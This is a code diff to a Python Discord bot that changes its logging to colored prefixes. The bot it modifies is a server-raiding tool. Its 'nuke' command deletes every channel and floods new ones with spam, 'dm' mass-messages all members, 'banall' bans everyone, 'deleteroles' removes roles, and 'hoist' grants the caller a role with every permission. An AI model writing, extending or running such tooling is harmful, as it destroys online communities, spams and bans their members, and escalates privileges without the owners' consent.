@@ -18,20 +18,27 @@ config = {
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=config["Prefix"], intents=intents)
 
+# logging variables
+system = "\033[94m[SYSTEM]\033[0m"
+err = "\033[91m[ERROR]\033[0m"
+info = "\033[93m[INFO]\033[0m"
+success = "\033[92m[SUCCESS]\033[0m"
+
 
 # events
 @bot.event
 async def on_ready():
-    print(f"Logged in as {bot.user} ({bot.user.id})")
+    print(f"{system} Logged in as {bot.user} ({bot.user.id})")
     await bot.change_presence(
         status=discord.Status.dnd,
         activity=discord.Activity(
             type=discord.ActivityType.watching, name=config["Status"]
         ),
     )
+    print(f"{system} Set status to 'Watching {config['Status']}'")
 
     print(
-        f"Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=157712&scope=bot"
+        f"{system} Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=157712&scope=bot"
     )
 
     print("\n----LOGS----\n")
@@ -40,14 +47,14 @@ async def on_ready():
 @bot.event
 async def on_command(ctx):
     print(
-        f"[INFO] {ctx.author.name} has attempted to run command '{config['Prefix']}{ctx.command.name}' in #{ctx.channel.name} - {ctx.guild.name} ({ctx.guild.id})"
+        f"{info} {ctx.author.name} has attempted to run command '{config['Prefix']}{ctx.command.name}' in #{ctx.channel.name} - {ctx.guild.name} ({ctx.guild.id})"
     )
 
 
 @bot.event
 async def on_command_error(ctx, error):
     await ctx.send(error)
-    print(f"[ERROR] {error}")
+    print(f"{err} {error}")
 
 
 # commands
@@ -59,27 +66,32 @@ async def nuke(ctx, channelCount, messages, channelName, *, message):
         try:
             await channel.delete()
             print(
-                f"[INFO] Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
+                f"{info} Deleted channel {channel.name} in {ctx.guild.name} ({ctx.guild.id})"
             )
 
         except Exception as error:
             print(
-                f"[ERROR] Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+                f"{err} Couldn't delete channel {channel.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
             )
 
     for i in range(int(channelCount)):
         try:
             channel = await ctx.guild.create_text_channel(name=channelName)
             print(
-                f"[INFO] Created text channel '{channelName}' in {ctx.guild.name} ({ctx.guild.id})"
+                f"{info} Created channel '{channelName}' in {ctx.guild.name} ({ctx.guild.id})"
             )
 
             for j in range(int(messages)):
                 await channel.send(message)
+                print(
+                    f"{info} Sent message '{message}' in channel '{channelName}' - {ctx.guild.name} ({ctx.guild.id})"
+                )
         except Exception as error:
             print(
-                f"Couldn't create text channel {channelName} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+                f"Couldn't create channel {channelName} in {ctx.guild.name} ({ctx.guild.id}): {error}"
             )
+
+    print(f"{success} Nuke has finished in {ctx.guild.name} ({ctx.guild.id})")
 
 
 @bot.command()
@@ -90,21 +102,22 @@ async def dm(ctx, amount, *, alert):
             try:
                 await member.send(alert)
                 print(
-                    f"[INFO] Sent message {alert} to {member.display_name} ({member.id})."
+                    f"{info} Sent message {alert} to {member.display_name} ({member.id})."
                 )
             except Exception as error:
                 print(
-                    f"[ERROR] Couldn't send message {alert} to {member.display_name} ({member.id}): {error}"
+                    f"{err} Couldn't send message {alert} to {member.display_name} ({member.id}): {error}"
                 )
 
     await message.delete()
+    print(f"{success} Mass DM has finished in {ctx.guild.name} ({ctx.guild.id})")
 
 
 @bot.command()
 @commands.has_permissions(ban_members=True)
 async def banall(ctx):
     if ctx.guild.get_member(bot.user.id).guild_permissions.ban_members == False:
-        print("[ERROR] Bot does not have ban permissions")
+        print("{err} Bot does not have ban permissions")
         return
 
     message = await ctx.send("Starting mass ban...")
@@ -113,15 +126,16 @@ async def banall(ctx):
         try:
             await ctx.guild.ban(member)
             print(
-                f"[INFO] Succesfully banned user {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id})"
+                f"{success} Succesfully banned user {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id})"
             )
 
         except Exception as error:
             print(
-                f"[ERROR] Failed to ban {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
+                f"{err} Failed to ban {member.name} ({member.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
             )
 
     await message.delete()
+    print(f"{success} Mass ban has finished in {ctx.guild.name} ({ctx.guild.id})")
 
 
 @bot.command()
@@ -131,14 +145,17 @@ async def deleteroles(ctx):
         try:
             await role.delete()
             print(
-                f"[INFO] Administrator role '{role.name}' has been deleted in {ctx.guild.name} ({ctx.guild.id})"
+                f"{info} Administrator role '{role.name}' has been deleted in {ctx.guild.name} ({ctx.guild.id})"
             )
         except Exception as error:
             print(
-                f"[ERROR] Failed to delete role {role.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
+                f"{err} Failed to delete role {role.name} in {ctx.guild.name} ({ctx.guild.id}): {error}"
             )
 
     await message.delete()
+    print(
+        f"{success} Mass role deletion has finished in {ctx.guild.name} ({ctx.guild.id})"
+    )
 
 
 @bot.command()
@@ -147,22 +164,20 @@ async def hoist(ctx, name):
         role = await ctx.guild.create_role(
             name=name, permissions=discord.Permissions.all()
         )
-
         await ctx.author.add_roles(role)
 
         print(
-            f"[INFO] Role {role.name} has been succesfully given to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id})"
+            f"{success} Role '{role.name}' has been succesfully given to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id})"
         )
-
         message = await ctx.send(
             f"You have succesfully been given the role <@&{role.id}>"
         )
-        await asyncio.sleep(3)
 
+        await asyncio.sleep(3)
         await message.delete()
     except Exception as error:
         print(
-            f"[ERROR] Failed to give role {role.name} to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
+            f"{err} Failed to give role {role.name} to {ctx.author.name} ({ctx.author.id}) in {ctx.guild.name} ({ctx.guild.id}): {error}"
         )
 
 
